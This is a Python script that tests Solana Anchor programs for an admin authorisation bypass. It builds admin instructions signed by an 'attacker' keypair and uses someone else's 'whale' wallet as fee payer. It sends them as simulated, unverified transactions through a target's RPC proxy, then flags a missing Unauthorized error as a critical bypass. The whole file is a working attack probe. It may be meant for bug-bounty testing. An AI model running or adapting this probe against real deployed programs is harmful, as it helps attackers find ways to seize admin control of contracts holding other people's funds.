#!/usr/bin/env python3
"""
Admin auth bypass probe for Anchor programs.
Runs simulateTransaction with sigVerify=false. No SOL needed.

Usage:
1. Fill in PROGRAM_ID, GLOBAL_CONFIG, WHALE_FEE_PAYER
2. Load IDL from JSON
3. Pick an admin ix name + construct arg_bytes per IDL args spec
4. Run — if err == None or err != 6039 (Unauthorized), you found a bug
"""
import json, base64, os, requests, struct
from solders.pubkey import Pubkey
from solders.keypair import Keypair
from solders.instruction import Instruction, AccountMeta
from solders.transaction import Transaction
from solders.message import Message
from solders.hash import Hash

DEVNET = "https://api.devnet.solana.com"
POPI = Pubkey.from_string("PROGRAM_ID_HERE")
GLOBAL_CONFIG = Pubkey.from_string("GLOBAL_CONFIG_PDA_HERE")
SYSTEM_PROGRAM = Pubkey.from_string("11111111111111111111111111111111")
WHALE_FEE_PAYER = Pubkey.from_string("WHALE_WALLET_WITH_SOL")  # find via getSignaturesForAddress

ATTACKER = Keypair.from_bytes(bytes(json.load(open("wallets/attacker.json"))))
IDL = json.load(open("idl.json"))
IX_MAP = {ix['name']: ix for ix in IDL['instructions']}


def find_pda(seeds_spec, ix_accounts=None):
    seeds = []
    for seed in seeds_spec:
        if seed['kind'] == 'const':
            seeds.append(bytes(seed['value']))
        elif seed['kind'] == 'account':
            path = seed['path']
            if path in (ix_accounts or {}):
                seeds.append(bytes(ix_accounts[path]))
            else:
                seeds.append(b'\x00'*32)
        elif seed['kind'] == 'arg':
            seeds.append(b'\x00'*8)
    return Pubkey.find_program_address(seeds, POPI)[0]


def build_admin_ix(ix_name, arg_bytes):
    ix = IX_MAP[ix_name]
    disc = bytes(ix['discriminator'])
    data = disc + arg_bytes

    accounts = []
    resolved = {'admin': ATTACKER.pubkey(), 'payer': WHALE_FEE_PAYER, 'authority': ATTACKER.pubkey()}

    for a in ix['accounts']:
        n = a['name']
        if a.get('pda'):
            pk = find_pda(a['pda']['seeds'], ix_accounts=resolved)
        elif n in ('admin', 'authority'):
            pk = ATTACKER.pubkey()
        elif n == 'payer':
            pk = WHALE_FEE_PAYER
        elif n == 'system_program':
            pk = SYSTEM_PROGRAM
        elif n == 'event_authority':
            pk = Pubkey.find_program_address([b"__event_authority"], POPI)[0]
        elif n == 'program':
            pk = POPI
        elif n == 'global_config':
            pk = GLOBAL_CONFIG
        elif n in resolved:
            pk = resolved[n]
        else:
            print(f"  ⚠️ unknown '{n}' — using system program")
            pk = SYSTEM_PROGRAM
        accounts.append(AccountMeta(pubkey=pk, is_signer=a.get('signer', False), is_writable=a.get('writable', False)))

    return Instruction(program_id=POPI, accounts=accounts, data=data)


def simulate(ix_list):
    r = requests.post(DEVNET, json={"jsonrpc":"2.0","id":1,"method":"getLatestBlockhash"}).json()
    blockhash = Hash.from_string(r['result']['value']['blockhash'])
    msg = Message.new_with_blockhash(ix_list, WHALE_FEE_PAYER, blockhash)
    tx = Transaction.new_unsigned(msg)
    tx_b64 = base64.b64encode(bytes(tx)).decode()

    # Simulate via TARGET RPC proxy (or direct DEVNET)
    resp = requests.post("https://TARGET/api/rpc", json={
        "jsonrpc":"2.0","id":1,"method":"simulateTransaction",
        "params":[tx_b64, {"encoding":"base64","sigVerify":False,"replaceRecentBlockhash":True}]
    }, timeout=20).json()
    val = resp.get('result', {}).get('value', {})
    return {
        'err': val.get('err'),
        'logs': val.get('logs') or [],
        'cu': val.get('unitsConsumed', 0),
    }


if __name__ == '__main__':
    # Example: try set_graduation_threshold(amount=10 SOL) as attacker
    arg_bytes = struct.pack('<Q', 10_000_000_000)
    ix = build_admin_ix('set_graduation_threshold', arg_bytes)
    result = simulate([ix])
    print(f"err: {result['err']}")
    print(f"cu:  {result['cu']}")
    for log in result['logs'][-6:]:
        print(f"  {log}")

    if result['err'] is None:
        print("\n🚨🚨🚨 CRITICAL P1: Admin bypass!")
    elif 'Custom' in str(result['err']):
        code = str(result['err'])
        if '6039' in code:
            print("\n✅ Expected 6039 Unauthorized — check works")
        else:
            print(f"\n⚠️ Non-6039 error — investigate: {code}")
